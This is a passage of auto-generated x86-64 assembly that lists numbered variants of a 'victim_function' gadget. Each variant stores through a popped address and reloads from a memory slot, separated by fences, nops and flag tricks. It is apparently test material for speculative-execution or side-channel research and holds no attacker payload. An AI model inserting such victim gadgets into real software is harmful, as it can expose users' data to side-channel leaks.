	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1412
.Lvictim_function_win0_var1412:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1413
.Lvictim_function_win0_var1413:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1414
.Lvictim_function_win0_var1414:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1415
.Lvictim_function_win0_var1415:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1416
.Lvictim_function_win0_var1416:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	nop
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1417
.Lvictim_function_win0_var1417:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1418
.Lvictim_function_win0_var1418:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1419
.Lvictim_function_win0_var1419:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1420
.Lvictim_function_win0_var1420:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1421
.Lvictim_function_win0_var1421:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1422
.Lvictim_function_win0_var1422:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1423
.Lvictim_function_win0_var1423:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1424
.Lvictim_function_win0_var1424:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1425
.Lvictim_function_win0_var1425:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	nop
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1426
.Lvictim_function_win0_var1426:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1427
.Lvictim_function_win0_var1427:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1428
.Lvictim_function_win0_var1428:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1429
.Lvictim_function_win0_var1429:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	pushfq
	andq	$0, %r10
	popfq
	nop
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1430
.Lvictim_function_win0_var1430:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1431
.Lvictim_function_win0_var1431:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1432
.Lvictim_function_win0_var1432:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1433
.Lvictim_function_win0_var1433:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1434
.Lvictim_function_win0_var1434:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1435
.Lvictim_function_win0_var1435:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1436
.Lvictim_function_win0_var1436:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1437
.Lvictim_function_win0_var1437:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1438
.Lvictim_function_win0_var1438:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1439
.Lvictim_function_win0_var1439:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1440
.Lvictim_function_win0_var1440:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1441
.Lvictim_function_win0_var1441:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1442
.Lvictim_function_win0_var1442:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1443
.Lvictim_function_win0_var1443:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1444
.Lvictim_function_win0_var1444:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1445
.Lvictim_function_win0_var1445:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	nop
	andq	$0, %r10
	nop
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1446
.Lvictim_function_win0_var1446:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1447
.Lvictim_function_win0_var1447:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1448
.Lvictim_function_win0_var1448:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1449
.Lvictim_function_win0_var1449:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1450
.Lvictim_function_win0_var1450:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1451
.Lvictim_function_win0_var1451:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1452
.Lvictim_function_win0_var1452:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	nop
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1453
.Lvictim_function_win0_var1453:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1454
.Lvictim_function_win0_var1454:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1455
.Lvictim_function_win0_var1455:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1456
.Lvictim_function_win0_var1456:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1457
.Lvictim_function_win0_var1457:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1458
.Lvictim_function_win0_var1458:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1459
.Lvictim_function_win0_var1459:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	nop
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1460
.Lvictim_function_win0_var1460:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1461
.Lvictim_function_win0_var1461:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1462
.Lvictim_function_win0_var1462:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1463
.Lvictim_function_win0_var1463:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	nop
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1464
.Lvictim_function_win0_var1464:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1465
.Lvictim_function_win0_var1465:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1466
.Lvictim_function_win0_var1466:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1467
.Lvictim_function_win0_var1467:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1468
.Lvictim_function_win0_var1468:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1469
.Lvictim_function_win0_var1469:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	nop
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1470
.Lvictim_function_win0_var1470:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1471
.Lvictim_function_win0_var1471:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	nop
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1472
.Lvictim_function_win0_var1472:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1473
.Lvictim_function_win0_var1473:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1474
.Lvictim_function_win0_var1474:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1475
.Lvictim_function_win0_var1475:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1476
.Lvictim_function_win0_var1476:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1477
.Lvictim_function_win0_var1477:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1478
.Lvictim_function_win0_var1478:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1479
.Lvictim_function_win0_var1479:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	nop
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1480
.Lvictim_function_win0_var1480:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	pushfq
	nop
	andq	$0, %r10
	nop
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1481
.Lvictim_function_win0_var1481:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1482
.Lvictim_function_win0_var1482:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1483
.Lvictim_function_win0_var1483:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1484
.Lvictim_function_win0_var1484:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1485
.Lvictim_function_win0_var1485:
	popq	%rax
	nop
	nop
	nop
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1486
.Lvictim_function_win0_var1486:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1487
.Lvictim_function_win0_var1487:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1488
.Lvictim_function_win0_var1488:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	nop
	mfence
	nop
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1489
.Lvictim_function_win0_var1489:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1490
.Lvictim_function_win0_var1490:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1491
.Lvictim_function_win0_var1491:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1492
.Lvictim_function_win0_var1492:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	nop
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1493
.Lvictim_function_win0_var1493:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1494
.Lvictim_function_win0_var1494:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	nop
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1495
.Lvictim_function_win0_var1495:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	pushfq
	nop
	andq	$0, %r10
	popfq
	nop
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1496
.Lvictim_function_win0_var1496:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1497
.Lvictim_function_win0_var1497:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	nop
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1498
.Lvictim_function_win0_var1498:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1499
.Lvictim_function_win0_var1499:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1500
.Lvictim_function_win0_var1500:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1501
.Lvictim_function_win0_var1501:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1502
.Lvictim_function_win0_var1502:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	nop
	nop
	nop
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1503
.Lvictim_function_win0_var1503:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	nop
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1504
.Lvictim_function_win0_var1504:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1505
.Lvictim_function_win0_var1505:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1506
.Lvictim_function_win0_var1506:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1507
.Lvictim_function_win0_var1507:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1508
.Lvictim_function_win0_var1508:
	popq	%rax
	movq	%rcx, (%rax)
